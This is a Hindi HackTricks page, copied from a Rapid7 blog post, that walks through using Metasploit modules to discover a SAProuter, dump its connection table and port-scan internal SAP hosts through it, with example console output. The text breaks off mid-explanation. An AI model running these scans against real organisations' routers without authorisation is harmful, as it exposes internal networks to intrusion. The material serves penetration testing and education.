<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рдпрд╛** рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>


Copy of: [https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/](https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/)
```text
PORT     STATE SERVICE    VERSION
3299/tcp open  saprouter?
```
# Metasploit рдХреЗ рд╕рд╛рде SAProuter рдХреЛ рдЫреЗрджрдирд╛

Saprouter рдореВрд▓ рд░реВрдк рд╕реЗ SAP рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдПрдХ рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА рд╣реИ, рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдФрд░ рдЖрдВрддрд░рд┐рдХ SAP рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдмреАрдЪ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рдЖрдВрддрд░рд┐рдХ SAP рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рдмреАрдЪ рдПрдХ рд╕рд╛рдзрд╛рд░рд┐рдд рдкрд╣реБрдВрдЪ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рдПрдХ рдкрд╛рд░рдВрдкрд░рд┐рдХ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рд╕реЗ рдЕрдзрд┐рдХ рдирд┐рдпрдВрддреНрд░рдг рд╡рд╛рд▓реЗ SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд╛рдорд╛рдиреНрдпрддрдГ saprouter рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рд╕рд╛рдордиреЗ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рдВрдЧрдарди рдХреЗ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдореЗрдВ saprouter рд╣реЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдЗрдирдмрд╛рдЙрдВрдб TCP рдкреЛрд░реНрдЯ 3299 рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ред рдФрд░ saprouter рд╕реЗ, рдХрдо рд╕реЗ рдХрдо рдПрдХ рдЖрдВрддрд░рд┐рдХ SAP рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ рдмрд╣реБрдд рд░реЛрдЪрдХ рд▓рдХреНрд╖реНрдп рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ "рдЙрдЪреНрдЪ рдореВрд▓реНрдп" рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдПрдХ рдорд╛рд░реНрдЧ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдирд┐рдореНрди рдЪрд┐рддреНрд░ рдореЗрдВ рдПрдХ рдореВрд▓ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрдЯрдЕрдк рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╣рдо рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ:

![](https://blog.rapid7.com/content/images/post-images/33923/image1.jpg)

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рд╣рдо рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдкрдиреЗ рджреНрд╡рд╛рд░рд╛ рдЙрдЬреНрдЬреНрд╡рд▓рд┐рдд IP рдкрддреЗ рдХреЗ SAP рд╕реЗрд╡рд╛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [`sap_service_discovery`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery) рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢реБрд░реВ рдХрд░реЗрдВрдЧреЗ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, 1.2.3.101.
```text
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
рд╕реНрдХреИрди рд╣рдореЗрдВ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рд╣реЛрд╕реНрдЯ рдЙрдореНрдореАрджрд┐рдд рдкреЛрд░реНрдЯ TCP 3299 рдкрд░ рдПрдХ SAP рд░рд╛рдЙрдЯрд░ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИред рдЕрдм рд╣рдо рдФрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ saprouter рд╕реЗ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдпрд╣ рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ рдЕрдХреНрд╕рд░ рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдВрддрд░рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХреЗ, рдЬреИрд╕реЗ рдХрд┐ saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдХреА рдЧрдИ рдХрдиреЗрдХреНрд╢рдиред рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рд╣рдо [`sap_router_info_request`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request) рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ:
```text
msf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request
msf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_router_info_request) > run

[+] 1.2.3.101:3299 - Connected to saprouter
[+] 1.2.3.101:3299 - Sending ROUTER_ADM packet info request
[+] 1.2.3.101:3299 - Got INFO response
[+] Working directory   : /opt/sap
[+] Routtab             : ./saprouttab

[SAP] SAProuter Connection Table for 1.2.3.101
===================================================

Source        Destination   Service
------        -----------   -------
1.2.3.12      192.168.1.18  3200


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
рддреЛ, рдЖрдЙрдЯрдкреБрдЯ рд╕реЗ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдХреЛрдИ \(1.2.3.12\) рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ \(192.168.1.18\) рд╕реЗ рдкреЛрд░реНрдЯ 3200 рдкрд░ рдХрдиреЗрдХреНрдЯ рд╣реИред рдкреЛрд░реНрдЯ 3200 рд╕реАрдорд┐рдд рд╕рдВрдЦреНрдпрд╛ рдХреЗ SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдкреЛрд░реНрдЯ рд╣реИ \(рдпрд╣рд╛рдВ SAP GUI рдПрдкреНрд▓рд┐рдХреЗрд╢рди SAP рд╕рд░реНрд╡рд░реЛрдВ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ\)ред рд╣рдо рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдкрддреЗ рдпреЛрдЬрдирд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдХрдо рд╕реЗ рдХрдо 192.168.1.0/24 рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдпрд╛ рдЙрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдХреБрдЫ рд╕рдмрдиреЗрдЯред

**рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдирд╛**

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рд╣рдо рдЕрдм рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреИрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред рд╕рдкрд░реВрдЯрд░ рдХреА рддрд░рд╣ рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВрдЧреЗ рдФрд░ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ рдкрд░ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВрдЧреЗ, рдФрд░ рд╕рдкрд░реВрдЯрд░ рд╕реЗ рдЙрддреНрддрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗред рдЗрд╕рд╕реЗ рд╕рдкрд░реВрдЯрд░ рдХреЗ рд╡рд┐рдиреНрдпрд╛рд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ, рд╕реЗрд╡рд╛рдУрдВ рдФрд░ ACLs рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╣рдо рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП [`sap_router_portscanner`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner) рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред

рдореЙрдбреНрдпреВрд▓ рд╕рдкрд░реВрдЯрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдирд┐рд╢реНрдЪрд┐рдд TCP рдкреЛрд░реНрдЯреЛрдВ рдореЗрдВ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯреЛрдВ \(TARGETS рд╡рд┐рдХрд▓реНрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд\) рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░ рдпрд╣ рдЙрддреНрддрд░реЛрдВ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ, рдФрд░ рд╕рдордЭрддрд╛ рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдзрд┐рдд рдХрдиреЗрдХреНрд╢рди рд╕рдВрднрд╡ рд╣реИ рдпрд╛ рдирд╣реАрдВред рдЗрд╕ рдореЙрдбреНрдпреВрд▓ рдореЗрдВ рдХреБрдЫ рд╡рд┐рдХрд▓реНрдк рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```text
Basic options:
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-99            no        SAP instance numbers to scan (NN in PORTS definition)
MODE         SAP_PROTO        yes       Connection Mode: SAP_PROTO or TCP  (accepted: SAP_PROTO, TCP)
PORTS        32NN             yes       Ports to scan (e.g. 3200-3299,5NN13)
RESOLVE      local            yes       Where to resolve TARGETS (accepted: remote, local)
RHOST                         yes       SAPRouter address
RPORT        3299             yes       SAPRouter TCP port
TARGETS                       yes       Comma delimited targets. When resolution is local address ranges or CIDR identifiers allowed.
```
рдХрдо рд╕реЗ рдХрдо рдЖрдкрдХреЛ saprouter рдХреЗ IP рдкрддреЗ рдХреЛ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдЙрджрд╛рд╣рд░рдг рдХреЗ рддреМрд░ рдкрд░, 1.2.3.101ред рдлрд┐рд░, рдЖрдкрдХреЛ рд╕реНрдХреИрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ TARGETS рдХреЛ рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЛрдВ рдХреЗ рд╕рд╛рде рд╕реЗрдЯ рдХрд░реЗрдВ, рдФрд░ рдЕрдВрдд рдореЗрдВ TCP рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рд╕рд╛рде PORTS рдХреЛ рд╕реЗрдЯ рдХрд░реЗрдВред

рдореЙрдбреНрдпреВрд▓ рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрдЬ рд╡рд┐рдХрд▓реНрдк рднреА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкреЛрд░реНрдЯреНрд╕ рд╡рд┐рдХрд▓реНрдк рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред SAP рд╕реНрдерд╛рдкрдирд╛рдПрдВ рдПрдХрд╛рдзрд┐рдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИрдВ, рдЬреЛ рд╕рдорд╛рди рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдкреНрд░рддреНрдпреЗрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ TCP рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╕реМрдВрдкрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, SAP рдЗрдВрд╕реНрдЯреЗрдВрд╕ 00 рдкрд░ рдкреЛрд░реНрдЯ 3200 рдкрд░ SAP рдбрд┐рд╕реНрдкреИрдЪрд░ рд╕реЗрд╡рд╛ рд╣реЛрдЧреА (рдЬрд╣рд╛рдВ SAP GUI рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ) рдФрд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ 01 рдкрд░ рдкреЛрд░реНрдЯ 3201 рдкрд░ред PORTS рд╡рд┐рдХрд▓реНрдк "рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб" рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬреЛ "NN" рд╣реИ рдЬреЛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдирдВрдмрд░ рдХреЗ рд╕рд╛рде рдмрджрд▓ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╕рднреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд▓рд┐рдП рдкреЛрд░реНрдЯреНрд╕ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рддреЛ, рдпрджрд┐ рд╣рдо 00 рд╕реЗ 50 рддрдХ рдХреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реНрдХреИрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рд╣рдо рдЗрд╕ рддрд░рд╣ рд╕реЗ INSTANCES рдФрд░ PORTS рдЪрд░ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```text
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-50
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
```
рдЗрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдореЙрдбреНрдпреВрд▓ рдкреЛрд░реНрдЯ 3200 рд╕реЗ 3250 рддрдХ рд╕реНрдХреИрди рдХрд░реЗрдЧрд╛ред

рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕реНрд░реЛрдд рдореЗрдВ рдЖрдкрдХреЛ SAP рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕рд╛рдорд╛рдиреНрдп рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА, рдЬрд┐рд╕реЗ рд╣рдо рдЕрдм рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ:
```text
msf > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > set RHOST 1.2.3.101
RHOST => 1.2.3.101
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.18
TARGETS => 192.168.1.18
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
PORTS => 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host           Port   State   Info
----           ----   -----   ----
192.168.1.18   3201   closed  SAP Dispatcher sapdp01
192.168.1.18   3200   open    SAP Dispatcher sapdp00
192.168.1.18   50013  open    SAP StartService [SOAP] sapctrl00

[*] Auxiliary module execution completed
```
рд╣рдо VERBOSE рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдордЭрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╕реИрдкрд░рд╛рдЙрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреБрдЫ рдХрдиреЗрдХреНрд╢рди рдХреНрдпреЛрдВ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИред VERBOSE рдХреЛ true рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдкрд░ рд╣рдо рд╕реИрдкрд░рд╛рдЙрдЯрд░ рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд ACL рдХреЛ рдореИрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдм рд╣рдо 192.168.1.18 рдФрд░ 192.168.1.1 рд╣реЛрд╕реНрдЯ рдХреЛ рд╕реНрдХреИрди рдХрд░реЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдкреЛрд░реНрдЯ 3200 рдкрд░, рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рдХреНрдпрд╛ рд╣рдо рджреЛрдиреЛрдВ SAP рдбрд┐рд╕реНрдкреИрдЪрд░реНрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```text
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.1,192.168.1.18
TARGETS => 192.168.1.1,192.168.1.18
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State   Info
----          ----  -----   ----
192.168.1.18  3200  open  SAP Dispatcher sapdp00

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[!] Warning: Service info could be inaccurate
[*] Auxiliary module execution completed
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдо рдЕрдм рдпрд╣ рднреА рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо рдкреЛрд░реНрдЯ 3200 рдкрд░ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ saprouter рдкрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд ACL рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реЛрдзрд┐рдд рд╣реИред

**ACL рдХрд╛ рдореИрдкрд┐рдВрдЧ**

saprouter рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рджреЛ рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ:

* Native - рдпреЗ рдХрдиреЗрдХреНрд╢рди рд╕рд╛рдзрд╛рд░рд┐рдд TCP рдХрдиреЗрдХреНрд╢рди рд╣реЛрддреЗ рд╣реИрдВ;
* SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ - рдпреЗ TCP рдХрдиреЗрдХреНрд╢рди рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдПрдХ рдЯреНрд╡рд┐рд╕реНрдЯ рд╣реЛрддрд╛ рд╣реИ, рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╣рддрд╛ рд╣реИ рдХрд┐ рд╕рднреА рд╕рдВрджреЗрд╢ рдЙрд╕рдХреЗ рдмрд╛рдж рдХреЗ рд╕рд╛рдордЧреНрд░реА рдХреА рд▓рдВрдмрд╛рдИ рдХреЛ рдмрддрд╛рдиреЗ рд╡рд╛рд▓реЗ 4 рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВред

